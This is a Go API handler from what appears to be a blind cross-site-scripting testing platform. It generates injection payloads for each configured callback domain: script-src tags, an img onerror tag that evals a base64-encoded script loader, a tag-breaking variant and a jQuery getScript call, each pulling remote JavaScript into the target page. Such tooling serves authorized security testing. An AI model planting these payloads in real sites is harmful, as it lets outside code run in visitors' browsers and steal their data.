package api

import (
	"encoding/base64"
	"html"
	"net/http"

	"github.com/thomasfady/xsstower/models"
	"github.com/thomasfady/xsstower/utils"

	"github.com/gin-gonic/gin"
)

type Payload struct {
	Name  string
	Value string
}

// @BasePath	/api/
// @Summary	Payloads
// @Description	Get formated payloads
// @Produce		json
// @Router			/payloads [get]
func GetPayloads(c *gin.Context) {

	user_id := c.GetInt("user_id")
	user := models.GetUserById(user_id)

	scheme := "http"
	if c.Request.TLS != nil || c.Request.Header.Get("X-Forwarded-Proto") == "https" {
		scheme = "https"
	}

	rbacs := user.HandlerRbacs()
	result := make(map[string][]Payload)
	for _, rbac := range rbacs {
		handler := rbac.Handler
		items := []Payload{}
		var url string
		if handler.Domain != "*" {
			url = scheme + "://" + handler.Domain
		} else {
			url = utils.BaseUrl(c)
		}

		path := handler.Path

		items = append(items, Payload{
			Name:  "Script src",
			Value: "<script src=\"" + url + "/" + path + "\"></script>",
		})

		img_error := "var a=document.createElement(\"script\");a.src=\"" + url + "/" + path + "\";document.body.appendChild(a);"
		b64 := base64.StdEncoding.EncodeToString([]byte(img_error))
		items = append(items, Payload{
			Name:  "Img tag",
			Value: "<img src=x id=" + html.EscapeString(b64) + " onerror=eval(atob(this.id))>",
		})

		items = append(items, Payload{
			Name:  "Script src with closing tag",
			Value: "\"><script src=\"" + url + "/" + path + "\"></script>",
		})

		items = append(items, Payload{
			Name:  "jQuery",
			Value: "$.getScript(\"" + url + "/" + path + "\")",
		})

		result[handler.Domain+"/"+handler.Path] = items
	}
	c.JSON(http.StatusOK, result)
}
